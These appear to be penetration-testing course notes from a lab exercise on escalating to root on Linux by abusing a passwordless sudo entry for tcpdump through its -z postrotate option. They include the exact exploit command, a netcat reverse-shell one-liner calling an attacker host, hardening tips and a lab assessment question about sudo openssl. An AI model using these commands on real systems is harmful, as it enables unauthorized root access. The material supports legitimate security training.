# Sudo Rights Abuse

any rights entries with the `NOPASSWD` option can be seen without entering a password.

```shell-session
sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

if the sudoers file is edited to grant a user the right to run a command such as `tcpdump` per the following entry in the sudoers file: `(ALL) NOPASSWD: /usr/sbin/tcpdump` an attacker could leverage this to take advantage of a the **postrotate-command** option.

```shell-session
man tcpdump

<SNIP> 
-z postrorate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands.

```shell-session
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

create the shell script `.test` containing a reverse shell and execute it

Make a file to execute with the `postrotate-command`, adding a simple reverse shell one-liner.

```shell-session
cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

start a `netcat` listener on our attacking box run `tcpdump` as root with the `postrotate-command`. If all goes to plan, we will receive a root reverse shell connection.

```shell-session
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root

```

[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing command execution. Two best practices that should always be considered when provisioning `sudo` rights:

1. Always specify the absolute path to any binaries listed in the `sudoers` file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be executed when the command runs (i.e., if the `sudoers` entry specifies `cat` instead of `/bin/cat` this could likely be abused).
2. Grant `sudo` rights sparingly and based on the principle of least privilege. Does the user need full `sudo` rights? Can they still perform their job with one or two entries in the `sudoers` file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation.

## Assessment

What command can the htb-student user run as root?

```
htb-student@NIX02:~$ sudo -l
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```
